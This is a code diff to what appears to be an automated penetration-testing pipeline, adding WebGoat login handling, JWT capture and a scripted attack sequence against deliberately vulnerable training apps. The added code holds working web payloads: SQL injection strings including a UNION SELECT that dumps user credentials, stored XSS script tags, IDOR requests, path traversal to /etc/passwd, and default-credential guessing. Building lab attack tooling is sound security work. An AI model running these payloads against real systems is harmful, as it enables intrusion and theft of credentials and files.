@@ -227,8 +227,13 @@ def node_login(state: PipelineState) -> dict:
         emit("stage", {"stage": "login_result", "data": result})
         emit("step_update", {"index": 0, "status": "complete"})
 
+    merged_headers = dict(state.get("_custom_headers", {}))
+    merged_headers.update(result.get("headers", {}) or {})
+
     return {
         "_session_cookie": result.get("cookie", ""),
+        "_custom_headers": merged_headers,
+        "_jwt_token": result.get("jwt_token"),
     }
 
 
@@ -515,6 +520,11 @@ async def export_pdf(state: dict):
             media_type="application/pdf",
             headers={"Content-Disposition": "attachment; filename=pentest_report.pdf"},
         )
+    except ModuleNotFoundError as e:
+        return Response(
+            content=f"PDF 생성 오류: {e}. `pip install reportlab` 후 서버를 재시작하세요.",
+            status_code=500,
+        )
     except Exception as e:
         return Response(content=f"PDF 생성 오류: {e}", status_code=500)
 
@@ -605,6 +615,16 @@ async def run_pipeline(
         "target_url": target_url,
         "target_ip": final_state.get("target_ip", "Unknown"),
         "detected_tech": final_state.get("detected_tech", "Unknown"),
+        "attack_url": final_state.get("_attack_url", ""),
+        "attack_method": final_state.get("_attack_method", ""),
+        "attack_data": final_state.get("_attack_data", {}),
+        "status_code": final_state.get("_status_code"),
+        "feedback": final_state.get("last_feedback", ""),
+        "indicators_found": final_state.get("_indicators_found", []),
+        "jwt_token": final_state.get("_jwt_token"),
+        "captured_email": final_state.get("_captured_email"),
+        "captured_role": final_state.get("_captured_role"),
+        "response_preview": final_state.get("_response_preview", ""),
     })
 
 
@@ -683,6 +703,92 @@ def _auto_login(target_url: str, username: str, password: str) -> dict:
                 return {"success": False, "cookie": "", "message": "WordPress 로그인 실패 — 아이디/비밀번호를 확인하세요"}
         except Exception as e:
             return {"success": False, "cookie": "", "message": f"로그인 오류: {str(e)[:120]}"}
+
+    # ── WebGoat ─────────────────────────────────────────────────────
+    target_l = (target_url or "").lower()
+    target_path_l = urlparse(target_url).path.lower()
+    if "webgoat" in target_l or "/webgoat" in target_path_l:
+        try:
+            login_url = f"{base}/WebGoat/login"
+            # 1) bootstrap cookie + XSRF
+            session.get(login_url, timeout=10, verify=False, allow_redirects=True)
+            xsrf = session.cookies.get("XSRF-TOKEN")
+
+            def _extract_token(obj):
+                if isinstance(obj, dict):
+                    for k in ("token", "access_token", "accessToken", "jwt", "authorization"):
+                        v = obj.get(k)
+                        if isinstance(v, str) and len(v) > 20:
+                            return v
+                    for v in obj.values():
+                        t = _extract_token(v)
+                        if t:
+                            return t
+                elif isinstance(obj, list):
+                    for item in obj:
+                        t = _extract_token(item)
+                        if t:
+                            return t
+                return None
+
+            # 2) JSON login (WebGoat 기본)
+            json_headers = {"Content-Type": "application/json", "Referer": login_url}
+            if xsrf:
+                json_headers["X-XSRF-TOKEN"] = xsrf
+            resp = session.post(
+                login_url,
+                json={"username": username, "password": password},
+                headers=json_headers,
+                timeout=10,
+                verify=False,
+                allow_redirects=True,
+            )
+
+            jwt_token = None
+            try:
+                jwt_token = _extract_token(resp.json())
+            except Exception:
+                jwt_token = None
+
+            # 3) form fallback
+            if not jwt_token:
+                form_headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url}
+                if xsrf:
+                    form_headers["X-XSRF-TOKEN"] = xsrf
+                resp = session.post(
+                    login_url,
+                    data={"username": username, "password": password},
+                    headers=form_headers,
+                    timeout=10,
+                    verify=False,
+                    allow_redirects=True,
+                )
+                try:
+                    jwt_token = _extract_token(resp.json())
+                except Exception:
+                    jwt_token = None
+
+            cookie_str = _cookie_string(session)
+            body_l = resp.text.lower()
+            has_session_cookie = bool(cookie_str) and (
+                "jsessionid" in cookie_str.lower() or "webgoat" in cookie_str.lower() or "xsrf-token" in cookie_str.lower()
+            )
+            failed_hint = any(x in body_l for x in ["invalid", "bad credentials", "unauthorized", "login failed"])
+            success = bool(jwt_token) or (has_session_cookie and not failed_hint)
+
+            headers = {}
+            if jwt_token:
+                headers["Authorization"] = f"Bearer {jwt_token}"
+
+            return {
+                "success": success,
+                "cookie": cookie_str if success else "",
+                "headers": headers,
+                "jwt_token": jwt_token,
+                "message": f"WebGoat 로그인 {'성공 ✅' if success else '실패 ❌'}",
+            }
+        except Exception as e:
+            return {"success": False, "cookie": "", "message": f"WebGoat 로그인 오류: {str(e)[:120]}"}
 
     # ── Generic Form Login ──────────────────────────────────────────
     for login_path in ["/login", "/user/login", "/auth/login", "/signin", "/account/login"]:
@@ -892,6 +998,69 @@ def _exploit(state: dict) -> dict:
 
     user_cookie = state.get("_session_cookie", "")
     user_headers = dict(state.get("_custom_headers", {}))
+    target_tech = state.get("detected_tech", "")
+    state_jwt = state.get("_jwt_token")
+
+    def _cookie_string(s: requests.Session) -> str:
+        return "; ".join(f"{k}={v}" for k, v in s.cookies.items())
+
+    def _extract_token_from_obj(obj):
+        if isinstance(obj, dict):
+            for k in ("token", "access_token", "accessToken", "jwt", "authorization"):
+                v = obj.get(k)
+                if isinstance(v, str) and len(v) > 20:
+                    return v
+            for v in obj.values():
+                t = _extract_token_from_obj(v)
+                if t:
+                    return t
+        elif isinstance(obj, list):
+            for item in obj:
+                t = _extract_token_from_obj(item)
+                if t:
+                    return t
+        return None
+
+    def _is_webgoat_login_page(text: str) -> bool:
+        lower = (text or "").lower()
+        return ("webgoat" in lower and "login" in lower and "username" in lower) or 'name="username"' in lower
+
+    def _try_webgoat_login(session: requests.Session, base_url: str) -> str:
+        login_url = f"{base_url}/WebGoat/login"
+        creds = [
+            ("guest", "guest"),
+            ("webgoat", "webgoat"),
+            ("hackymocchi", "hacky123!"),
+            ("tom", "cat"),
+        ]
+        for username, password in creds:
+            try:
+                headers = {"Content-Type": "application/json"}
+                xsrf = session.cookies.get("XSRF-TOKEN")
+                if xsrf:
+                    headers["X-XSRF-TOKEN"] = xsrf
+                r = session.post(
+                    login_url,
+                    json={"username": username, "password": password},
+                    headers=headers,
+                    timeout=6,
+                    verify=False,
+                    allow_redirects=True,
+                )
+                token = None
+                try:
+                    token = _extract_token_from_obj(r.json())
+                except Exception:
+                    pass
+                if token:
+                    session.headers.update({"Authorization": f"Bearer {token}"})
+                    return token
+                # 토큰이 없어도 세션 쿠키가 생기면 로그인 성공으로 간주
+                if session.cookies.get("JSESSIONID") or session.cookies.get("WEBGOAT_SESSION"):
+                    return ""
+            except Exception:
+                continue
+        return None
 
     try:
         session = requests.Session()
@@ -899,6 +1068,26 @@ def _exploit(state: dict) -> dict:
             session.headers.update({"Cookie": user_cookie})
         if user_headers:
             session.headers.update(user_headers)
+        if state_jwt:
+            session.headers.update({"Authorization": f"Bearer {state_jwt}"})
+
+        # WebGoat는 세션/JWT/XSRF 토큰이 없으면 대부분의 lesson 요청이 실패한다.
+        if "WebGoat" in target_tech:
+            try:
+                p = urlparse(payload)
+                bootstrap = f"{p.scheme}://{p.netloc}/WebGoat/login"
+                session.get(bootstrap, timeout=5, verify=False, allow_redirects=True)
+                payload_l = payload.lower()
+                is_webgoat_vuln_path = any(x in payload_l for x in [
+                    "/sqlinjection/", "/crosssitescripting/", "/access-control/",
+                    "/pathtraversal/", "/jwt/", "/api/",
+                ])
+                if is_webgoat_vuln_path and not state_jwt and "login" not in payload_l and "register" not in payload_l:
+                    auto_token = _try_webgoat_login(session, f"{p.scheme}://{p.netloc}")
+                    if auto_token:
+                        state_jwt = auto_token
+            except Exception:
+                pass
 
         # ── CSRF 토큰 추출 (form 기반 POST 전에 실행) ──────────────────
         csrf_token = None
@@ -924,24 +1113,108 @@ def _exploit(state: dict) -> dict:
                 pass
 
         if method == "POST":
+            extra_headers = {}
+            if "WebGoat" in target_tech:
+                xsrf = session.cookies.get("XSRF-TOKEN")
+                if xsrf:
+                    extra_headers["X-XSRF-TOKEN"] = xsrf
+
             if req_content_type == "form":
                 res = session.post(
                     payload, data=post_data,
-                    headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": payload},
+                    headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": payload, **extra_headers},
                     timeout=8, verify=False, allow_redirects=True,
                 )
             else:
                 res = session.post(
                     payload, json=post_data,
-                    headers={"Content-Type": "application/json"},
+                    headers={"Content-Type": "application/json", **extra_headers},
                     timeout=8, verify=False,
                 )
         else:
-            res = session.get(payload, timeout=8, verify=False)
+            extra_headers = {}
+            if "WebGoat" in target_tech:
+                xsrf = session.cookies.get("XSRF-TOKEN")
+                if xsrf:
+                    extra_headers["X-XSRF-TOKEN"] = xsrf
+            res = session.get(payload, timeout=8, verify=False, headers=extra_headers or None)
+
+        # WebGoat PathTraversal은 인스턴스에 따라 GET이 아닌 POST만 허용될 수 있다.
+        if (
+            "WebGoat" in target_tech
+            and method == "GET"
+            and res.status_code == 405
+            and "/pathtraversal/" in payload.lower()
+        ):
+            retry_headers = {}
+            xsrf = session.cookies.get("XSRF-TOKEN")
+            if xsrf:
+                retry_headers["X-XSRF-TOKEN"] = xsrf
+            # 흔히 쓰이는 파라미터명들을 순차 시도
+            retry_bodies = [
+                {"path": "../../../../etc/passwd"},
+                {"file": "../../../../etc/passwd"},
+                {"filename": "../../../../etc/passwd"},
+            ]
+            for body in retry_bodies:
+                try:
+                    res = session.post(
+                        payload,
+                        data=body,
+                        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": payload, **retry_headers},
+                        timeout=8,
+                        verify=False,
+                        allow_redirects=True,
+                    )
+                    if res.status_code != 405:
+                        post_data = body
+                        method = "POST"
+                        req_content_type = "form"
+                        break
+                except Exception:
+                    continue
+
+        # WebGoat lesson 응답이 로그인 페이지면 1회 자동 로그인 후 재시도
+        if "WebGoat" in target_tech:
+            payload_l = payload.lower()
+            is_webgoat_vuln_path = any(x in payload_l for x in [
+                "/sqlinjection/", "/crosssitescripting/", "/access-control/",
+                "/pathtraversal/", "/jwt/", "/api/",
+            ])
+            if is_webgoat_vuln_path and _is_webgoat_login_page(res.text):
+                p = urlparse(payload)
+                auto_token = _try_webgoat_login(session, f"{p.scheme}://{p.netloc}")
+                if auto_token:
+                    state_jwt = auto_token
+                retry_headers = {}
+                xsrf = session.cookies.get("XSRF-TOKEN")
+                if xsrf:
+                    retry_headers["X-XSRF-TOKEN"] = xsrf
+                if method == "POST":
+                    if req_content_type == "form":
+                        res = session.post(
+                            payload,
+                            data=post_data,
+                            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": payload, **retry_headers},
+                            timeout=8,
+                            verify=False,
+                            allow_redirects=True,
+                        )
+                    else:
+                        res = session.post(
+                            payload,
+                            json=post_data,
+                            headers={"Content-Type": "application/json", **retry_headers},
+                            timeout=8,
+                            verify=False,
+                        )
+                else:
+                    res = session.get(payload, timeout=8, verify=False, headers=retry_headers or None)
 
         status_code = res.status_code
         is_json = "application/json" in res.headers.get("Content-Type", "")
         response_preview = res.text[:400]
+        merged_cookie = _cookie_string(session) or user_cookie
 
         # ── JWT 토큰 추출 ────────────────────────────────────────────────
         jwt_token = None
@@ -961,6 +1234,9 @@ def _exploit(state: dict) -> dict:
         except Exception:
             pass
 
+        if not jwt_token and state_jwt:
+            jwt_token = state_jwt
+
         if not jwt_token:
             jwt_match = re.search(
                 r'eyJ[A-Za-z0-9+/=_-]{10,}\.[A-Za-z0-9+/=_-]{10,}\.[A-Za-z0-9+/=_-]{10,}',
@@ -971,13 +1247,15 @@ def _exploit(state: dict) -> dict:
 
         # ── 성공 판정 ────────────────────────────────────────────────────
         discovered_gruyere_uid = state.get("_gruyere_uid", "")
-        if not discovered_gruyere_uid and "Gruyere" in state.get("detected_tech", ""):
+        if not discovered_gruyere_uid and "Gruyere" in target_tech:
             discovered_gruyere_uid = _discover_gruyere_uid(
                 target_url=state.get("target_url", ""),
                 final_url=str(res.url),
                 response_text=res.text,
                 location_header=res.headers.get("Location", ""),
             )
+
+        derived_indicators = []
 
         if is_login_endpoint:
             if req_content_type == "form":
@@ -1006,9 +1284,33 @@ def _exploit(state: dict) -> dict:
                 elif ".bak" in payload or ".backup" in payload:
                     is_success = _is_real_file_exposed(res.text, "bak", status_code)
             # ── App-specific indicators ───────────────────────────────────
-            _tech = state.get("detected_tech", "")
+            _tech = target_tech
             if not is_success and "WebGoat" in _tech:
-                is_success = any(ind in res.text for ind in webgoat_indicators)
+                payload_l = payload.lower()
+                body_l = res.text.lower()
+                # WebGoat는 정상 페이지도 "success"류 단어가 많아,
+                # 취약성 확인용 lesson/API 엔드포인트에서만 판정한다.
+                webgoat_vuln_path = any(p in payload_l for p in [
+                    "/sqlinjection/", "/crosssitescripting/", "/access-control/",
+                    "/pathtraversal/", "/jwt/", "/api/",
+                ])
+                if webgoat_vuln_path:
+                    is_success = any(ind.lower() in body_l for ind in webgoat_indicators)
+                    if not is_success and "/access-control/user-info" in payload_l and status_code == 200:
+                        has_account_obj = ('"account"' in body_l or '"username"' in body_l) and ("tom" in body_l)
+                        if has_account_obj:
+                            is_success = True
+                            derived_indicators.append("WebGoat IDOR data exposed")
+                    if not is_success and "/sqlinjection/" in payload_l and status_code in (200, 500):
+                        if any(k in body_l for k in ["congrat", "lessoncompleted", "sql", "exception", "error"]):
+                            is_success = True
+                            derived_indicators.append("WebGoat SQLi lesson indicator")
+                    if not is_success and "/crosssitescripting/" in payload_l and status_code == 200:
+                        if any(k in body_l for k in ["<script", "alert(", "xss", "congrat"]):
+                            is_success = True
+                            derived_indicators.append("WebGoat XSS lesson indicator")
+                else:
+                    is_success = False
             elif not is_success and "Gruyere" in _tech:
                 payload_l = payload.lower()
                 body_l = res.text.lower()
@@ -1059,6 +1361,7 @@ def _exploit(state: dict) -> dict:
 
         all_indicators = generic_indicators + login_indicators + ctf_indicators + robots_sensitive + webgoat_indicators + gruyere_indicators
         found = [ind for ind in all_indicators if ind.lower() in res.text.lower()] if is_success else []
+        found = derived_indicators + found
         found = ctf_extracted + found  # CTF 추출 결과 맨 앞에 표시
         if jwt_token and "token" not in found:
             found.insert(0, "JWT token captured")
@@ -1091,6 +1394,7 @@ def _exploit(state: dict) -> dict:
             "_attack_method": method,
             "_attack_data": post_data,
             "_gruyere_uid": discovered_gruyere_uid,
+            "_session_cookie": merged_cookie,
         }
     except Exception as e:
         return {
@@ -1107,6 +1411,7 @@ def _exploit(state: dict) -> dict:
             "_attack_method": method,
             "_attack_data": post_data,
             "_gruyere_uid": state.get("_gruyere_uid", ""),
+            "_session_cookie": user_cookie,
         }
 
 
@@ -1318,38 +1623,46 @@ def _rule_based_payload(state: dict, attempt: int) -> dict:
 
     if "WebGoat" in tech:
         attacks = [
-            {"url": f"{base}/WebGoat/register", "method": "POST", "content_type": "json",
-             "data": {"username": "hacker", "password": "hacker123!", "matchingPassword": "hacker123!", "role": "WEBGOAT_ADMIN"},
-             "explanation": "[1/12] Register with WEBGOAT_ADMIN role — privilege escalation"},
+            {"url": f"{base}/WebGoat/start.mvc", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[1/12] Bootstrap session/token from start page"},
+            {"url": f"{base}/WebGoat/login", "method": "POST", "content_type": "json",
+             "data": {"username": "guest", "password": "guest"},
+             "explanation": "[2/12] Login with default guest account (JSON)"},
+            {"url": f"{base}/WebGoat/login", "method": "POST", "content_type": "json",
+             "data": {"username": "webgoat", "password": "webgoat"},
+             "explanation": "[3/12] Login with default webgoat account (JSON)"},
+            {"url": f"{base}/WebGoat/register", "method": "POST", "content_type": "form",
+             "data": {
+                 "username": "hackymocchi",
+                 "password": "hacky123!",
+                 "matchingPassword": "hacky123!",
+                 "confirmPassword": "hacky123!",
+                 "agree": "agree",
+             },
+             "explanation": "[4/12] Register test account (form + CSRF)"},
             {"url": f"{base}/WebGoat/login", "method": "POST", "content_type": "form",
-             "data": {"username": "hacker", "password": "hacker123!"},
-             "explanation": "[2/12] Login with registered credentials"},
+             "data": {"username": "hackymocchi", "password": "hacky123!"},
+             "explanation": "[5/12] Login with test account"},
             {"url": f"{base}/WebGoat/SqlInjection/attack5a", "method": "POST", "content_type": "form",
              "data": {"account": "Smith' OR '1'='1", "operator": "3", "injection": ""},
-             "explanation": "[3/12] SQLi on string field — always-true condition"},
+             "explanation": "[6/12] SQLi on string field — always-true condition"},
             {"url": f"{base}/WebGoat/SqlInjection/attack6a", "method": "POST", "content_type": "form",
              "data": {"account": "Smith", "operator": "3", "injection": "1 OR 1=1"},
-             "explanation": "[4/12] SQLi on numeric field"},
-            {"url": f"{base}/WebGoat/service/lessonmenu.mvc", "method": "GET", "content_type": "json",
-             "data": {}, "explanation": "[5/12] Lesson menu info disclosure"},
-            {"url": f"{base}/WebGoat/access-control/user-info?account=Tom", "method": "GET", "content_type": "json",
-             "data": {}, "explanation": "[6/12] IDOR — access Tom's account without auth"},
+             "explanation": "[7/12] SQLi on numeric field"},
             {"url": f"{base}/WebGoat/SqlInjection/attack8", "method": "POST", "content_type": "form",
              "data": {"name": "Smith' UNION SELECT userid,user_name,password,cookie,1,1,1 FROM user_system_data--"},
-             "explanation": "[7/12] UNION-based SQLi — extract all user credentials"},
+             "explanation": "[8/12] UNION-based SQLi — extract user credentials"},
+            {"url": f"{base}/WebGoat/access-control/user-info?account=Tom", "method": "GET", "content_type": "json",
+             "data": {}, "explanation": "[9/12] IDOR — access Tom's account without auth"},
             {"url": f"{base}/WebGoat/CrossSiteScripting/attack5a", "method": "POST", "content_type": "form",
              "data": {"QTY1": "1", "QTY2": "1", "QTY3": "<script>alert(document.domain)</script>", "QTY4": "1",
                       "field1": "x", "field2": "<script>alert(document.domain)</script>"},
-             "explanation": "[8/12] Stored XSS via shopping cart field"},
+             "explanation": "[10/12] Stored XSS via shopping cart field"},
             {"url": f"{base}/WebGoat/JWT/votings", "method": "GET", "content_type": "json",
-             "data": {}, "explanation": "[9/12] JWT endpoint — inspect token structure"},
-            {"url": f"{base}/WebGoat/login", "method": "POST", "content_type": "form",
-             "data": {"username": "' OR '1'='1", "password": "x"},
-             "explanation": "[10/12] SQLi auth bypass on login form"},
-            {"url": f"{base}/WebGoat/PathTraversal/profile-upload", "method": "GET", "content_type": "json",
-             "data": {}, "explanation": "[11/12] Path traversal profile-upload endpoint"},
-            {"url": f"{base}/WebGoat/robots.txt", "method": "GET", "content_type": "json",
-             "data": {}, "explanation": "[12/12] Recon — robots.txt for hidden paths"},
+             "data": {}, "explanation": "[11/12] JWT endpoint — inspect token structure"},
+            {"url": f"{base}/WebGoat/PathTraversal/profile-upload", "method": "POST", "content_type": "form",
+             "data": {"path": "../../../../etc/passwd"},
+             "explanation": "[12/12] Path traversal profile-upload endpoint (POST)"},
         ]
         return attacks[(attempt - 1) % len(attacks)]
 
